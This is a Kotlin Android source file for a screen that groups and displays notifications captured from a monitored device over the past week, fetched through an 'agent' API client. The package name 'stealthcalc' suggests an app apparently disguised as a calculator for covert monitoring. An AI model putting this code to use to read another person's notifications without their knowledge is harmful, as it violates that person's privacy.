package com.stealthcalc.monitoring.ui

import androidx.compose.foundation.clickable
import androidx.compose.foundation.layout.Arrangement
import androidx.compose.foundation.layout.Column
import androidx.compose.foundation.layout.Row
import androidx.compose.foundation.layout.Spacer
import androidx.compose.foundation.layout.fillMaxSize
import androidx.compose.foundation.layout.fillMaxWidth
import androidx.compose.foundation.layout.height
import androidx.compose.foundation.layout.padding
import androidx.compose.foundation.layout.size
import androidx.compose.foundation.lazy.LazyColumn
import androidx.compose.foundation.lazy.items
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.automirrored.filled.ArrowBack
import androidx.compose.material.icons.filled.Notifications
import androidx.compose.material3.Card
import androidx.compose.material3.CardDefaults
import androidx.compose.material3.ExperimentalMaterial3Api
import androidx.compose.material3.Icon
import androidx.compose.material3.IconButton
import androidx.compose.material3.MaterialTheme
import androidx.compose.material3.Scaffold
import androidx.compose.material3.Text
import androidx.compose.material3.TopAppBar
import androidx.compose.material3.TopAppBarDefaults
import androidx.compose.runtime.Composable
import androidx.compose.runtime.getValue
import androidx.compose.runtime.mutableStateOf
import androidx.compose.runtime.remember
import androidx.compose.runtime.setValue
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.text.style.TextOverflow
import androidx.compose.ui.unit.dp
import androidx.hilt.navigation.compose.hiltViewModel
import androidx.lifecycle.ViewModel
import androidx.lifecycle.compose.collectAsStateWithLifecycle
import androidx.lifecycle.viewModelScope
import com.stealthcalc.monitoring.data.MonitoringRepository
import com.stealthcalc.monitoring.network.AgentApiClient
import dagger.hilt.android.lifecycle.HiltViewModel
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.StateFlow
import kotlinx.coroutines.flow.asStateFlow
import kotlinx.coroutines.launch
import kotlinx.serialization.json.Json
import kotlinx.serialization.json.jsonObject
import kotlinx.serialization.json.jsonPrimitive
import javax.inject.Inject

data class NotifAppGroup(
    val appName: String,
    val packageName: String,
    val count: Int,
    val lastTime: Long,
)

data class NotifEntry(
    val title: String?,
    val text: String?,
    val postedAt: Long,
)

data class NotifHistoryState(
    val groups: List<NotifAppGroup> = emptyList(),
    val selectedApp: NotifAppGroup? = null,
    val entries: List<NotifEntry> = emptyList(),
)

@HiltViewModel
class NotificationHistoryViewModel @Inject constructor(
    private val repository: MonitoringRepository,
    private val apiClient: AgentApiClient,
) : ViewModel() {
    private val json = Json { ignoreUnknownKeys = true }
    private val _state = MutableStateFlow(NotifHistoryState())
    val state: StateFlow<NotifHistoryState> = _state.asStateFlow()
    private var allNotifEvents = listOf<com.stealthcalc.monitoring.model.EventPayload>()

    init { load() }

    fun load() {
        viewModelScope.launch {
            val events = apiClient.getEvents(
                repository.deviceId,
                since = System.currentTimeMillis() - 7 * 24 * 3600 * 1000L
            ).filter { it.kind == "NOTIFICATION" }
            allNotifEvents = events

            val grouped = mutableMapOf<String, MutableList<com.stealthcalc.monitoring.model.EventPayload>>()
            for (event in events) {
                val obj = runCatching { json.parseToJsonElement(event.payload).jsonObject }.getOrNull() ?: continue
                val pkg = obj["packageName"]?.jsonPrimitive?.content ?: continue
                grouped.getOrPut(pkg) { mutableListOf() }.add(event)
            }

            val groups = grouped.map { (pkg, evts) ->
                val last = evts.maxByOrNull { it.capturedAt }
                val lastObj = last?.let { runCatching { json.parseToJsonElement(it.payload).jsonObject }.getOrNull() }
                NotifAppGroup(
                    appName = lastObj?.get("appName")?.jsonPrimitive?.content ?: pkg,
                    packageName = pkg,
                    count = evts.size,
                    lastTime = last?.capturedAt ?: 0,
                )
            }.sortedByDescending { it.count }

            _state.value = NotifHistoryState(groups = groups)
        }
    }

    fun selectApp(group: NotifAppGroup) {
        val entries = allNotifEvents.filter { event ->
            val obj = runCatching { json.parseToJsonElement(event.payload).jsonObject }.getOrNull()
            obj?.get("packageName")?.jsonPrimitive?.content == group.packageName
        }.sortedByDescending { it.capturedAt }.map { event ->
            val obj = runCatching { json.parseToJsonElement(event.payload).jsonObject }.getOrNull()
            NotifEntry(
                title = obj?.get("title")?.jsonPrimitive?.content,
                text = obj?.get("text")?.jsonPrimitive?.content,
                postedAt = event.capturedAt,
            )
        }
        _state.value = _state.value.copy(selectedApp = group, entries = entries)
    }

    fun clearSelection() {
        _state.value = _state.value.copy(selectedApp = null, entries = emptyList())
    }
}

@OptIn(ExperimentalMaterial3Api::class)
@Composable
fun NotificationHistoryScreen(
    onBack: () -> Unit,
    viewModel: NotificationHistoryViewModel = hiltViewModel(),
) {
    val state by viewModel.state.collectAsStateWithLifecycle()

    Scaffold(
        topBar = {
            TopAppBar(
                title = { Text(state.selectedApp?.appName ?: "Notifications by App") },
                navigationIcon = {
                    IconButton(onClick = {
                        if (state.selectedApp != null) viewModel.clearSelection() else onBack()
                    }) {
                        Icon(Icons.AutoMirrored.Filled.ArrowBack, contentDescription = "Back")
                    }
                },
                colors = TopAppBarDefaults.topAppBarColors(
                    containerColor = MaterialTheme.colorScheme.background,
                    titleContentColor = MaterialTheme.colorScheme.onBackground,
                )
            )
        }
    ) { padding ->
        if (state.selectedApp != null) {
            LazyColumn(
                modifier = Modifier.fillMaxSize().padding(padding).padding(horizontal = 16.dp),
                verticalArrangement = Arrangement.spacedBy(6.dp),
            ) {
                item { Spacer(modifier = Modifier.height(4.dp)) }
                items(state.entries) { entry ->
                    Card(
                        modifier = Modifier.fillMaxWidth(),
                        colors = CardDefaults.cardColors(containerColor = MaterialTheme.colorScheme.surfaceVariant)
                    ) {
                        Column(modifier = Modifier.padding(12.dp)) {
                            entry.title?.let { Text(it, style = MaterialTheme.typography.bodyMedium) }
                            entry.text?.let {
                                Text(it, style = MaterialTheme.typography.bodySmall, color = MaterialTheme.colorScheme.onSurfaceVariant.copy(alpha = 0.7f), maxLines = 3, overflow = TextOverflow.Ellipsis)
                            }
                            val sdf = java.text.SimpleDateFormat("MMM d, h:mm a", java.util.Locale.US)
                            Text(sdf.format(java.util.Date(entry.postedAt)), style = MaterialTheme.typography.labelSmall, color = MaterialTheme.colorScheme.onSurfaceVariant.copy(alpha = 0.4f))
                        }
                    }
                }
            }
        } else {
            LazyColumn(
                modifier = Modifier.fillMaxSize().padding(padding).padding(horizontal = 16.dp),
                verticalArrangement = Arrangement.spacedBy(8.dp),
            ) {
                item { Spacer(modifier = Modifier.height(4.dp)) }
                items(state.groups) { group ->
                    Card(
                        modifier = Modifier.fillMaxWidth().clickable { viewModel.selectApp(group) },
                        colors = CardDefaults.cardColors(containerColor = MaterialTheme.colorScheme.surfaceVariant)
                    ) {
                        Row(modifier = Modifier.padding(12.dp), verticalAlignment = Alignment.CenterVertically) {
                            Icon(Icons.Default.Notifications, null, Modifier.size(28.dp), tint = MaterialTheme.colorScheme.primary)
                            Column(modifier = Modifier.weight(1f).padding(start = 12.dp)) {
                                Text(group.appName, style = MaterialTheme.typography.titleSmall)
                                Text(group.packageName, style = MaterialTheme.typography.bodySmall, color = MaterialTheme.colorScheme.onSurfaceVariant.copy(alpha = 0.5f), maxLines = 1, overflow = TextOverflow.Ellipsis)
                            }
                            Text("${group.count}", style = MaterialTheme.typography.titleMedium, color = MaterialTheme.colorScheme.primary)
                        }
                    }
                }
            }
        }
    }
}
